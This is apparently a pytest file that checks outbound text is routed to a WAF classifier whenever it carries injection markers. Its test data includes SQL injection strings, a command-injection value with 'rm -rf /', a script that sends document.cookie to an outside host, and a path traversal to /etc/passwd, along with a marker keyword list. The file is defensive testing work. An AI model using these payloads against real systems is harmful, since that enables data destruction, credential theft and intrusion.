"""The router must not decide whether an outbound attack reaches the WAF.

Measured gap: `1 UNION SELECT username, password FROM users--` is routed `code`, and route `code`
skipped the WAF, so the SQL injection was allowed. Outbound bodies that carry a strong injection
marker now reach the WAF whatever the router said. Benign code/prose without markers still skips
it (latency + false positives), and inbound traffic is never WAF-scanned.
"""
import os
import sys

import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from ml.router.predictor import RouteDecision  # noqa: E402
from text_service import main as svc  # noqa: E402


class _Pred:
    def __init__(self, blocked):
        self.blocked, self.label, self.score, self.risk = blocked, "sqli", 0.99, "high"


class FakeWAF:
    """Blocks anything containing 'union select' / 'rm -rf' / '<script'; records inputs."""
    def __init__(self):
        self.seen = []

    def predict(self, text):
        self.seen.append(text)
        low = text.lower()
        return _Pred(any(k in low for k in ("union select", "rm -rf", "<script", "../../", "document.cookie")))


class FixedRouter:
    def __init__(self, route):
        self.r = route

    def route(self, text):
        return RouteDecision(self.r, 0.9)


@pytest.fixture
def waf(monkeypatch):
    f = FakeWAF()
    monkeypatch.setattr(svc, "waf_classifier", f)
    return f


def _force(monkeypatch, route):
    monkeypatch.setattr(svc, "router_classifier", FixedRouter(route))


def _blocked(out):
    return str(out["status"]).lower().endswith("block")


ATTACKS = [
    "1 UNION SELECT username, password FROM users--",
    "id=1 UNION SELECT username, password FROM users--",
    "8.8.8.8; rm -rf / --no-preserve-root",
    "SELECT name FROM t WHERE id=1 UNION SELECT password FROM users",
    "<script>\n  var x = 1;\n  document.location='http://e/'+document.cookie\n</script>",
    "path=../../../../etc/passwd",
    "Hi team, please try this input in the form: 1 UNION SELECT user,pass FROM u-- and tell me",
]


@pytest.mark.parametrize("route", ["code", "prose"])
@pytest.mark.parametrize("body", ATTACKS)
def test_outbound_attack_reaches_waf_whatever_the_router_said(monkeypatch, waf, route, body):
    _force(monkeypatch, route)
    out = svc._analyze_sync(body, False, "outbound")
    assert waf.seen, f"WAF never ran for route={route}: {body!r}"
    assert _blocked(out)


@pytest.mark.parametrize("route", ["code", "prose", "web_request"])
def test_inbound_is_never_waf_scanned(monkeypatch, waf, route):
    _force(monkeypatch, route)
    out = svc._analyze_sync("1 UNION SELECT username, password FROM users--", False, "inbound")
    assert waf.seen == []
    assert not _blocked(out)


BENIGN_CODE = [
    "def add(a, b):\n    return a + b\n\nprint(add(1, 2))",
    "for (let i = 0; i < n; i++) {\n  total += items[i].price;\n}",
    "#!/bin/sh\nset -e\nfor f in *.txt; do\n  echo \"$f\"\ndone",
    "The quick brown fox jumps over the lazy dog. We select the best option from the menu.",
    "Please update the union of the two lists and delete duplicates from the table of contents.",
]


@pytest.mark.parametrize("route", ["code", "prose"])
@pytest.mark.parametrize("body", BENIGN_CODE)
def test_benign_code_and_prose_without_markers_skip_the_waf(monkeypatch, waf, route, body):
    _force(monkeypatch, route)
    svc._analyze_sync(body, False, "outbound")
    assert waf.seen == []


def test_web_request_route_still_runs_waf(monkeypatch, waf):
    _force(monkeypatch, "web_request")
    assert _blocked(svc._analyze_sync("q=1 UNION SELECT a,b FROM c--", False, "outbound"))


def test_waf_sees_only_the_marked_part_of_a_big_benign_blob(monkeypatch, waf):
    """A long benign document that contains one injection line must not be sent whole."""
    _force(monkeypatch, "prose")
    doc = ("Lorem ipsum dolor sit amet. " * 200) + "\n1 UNION SELECT username, password FROM users--\n" + ("tail text. " * 200)
    out = svc._analyze_sync(doc, False, "outbound")
    assert _blocked(out)
    assert all(len(s) < 1500 for s in waf.seen)


def test_gate_function_is_pure_and_cheap():
    assert svc.waf_gate_parts("1 UNION SELECT a,b FROM c--")
    assert svc.waf_gate_parts("hello world, nothing to see") == []
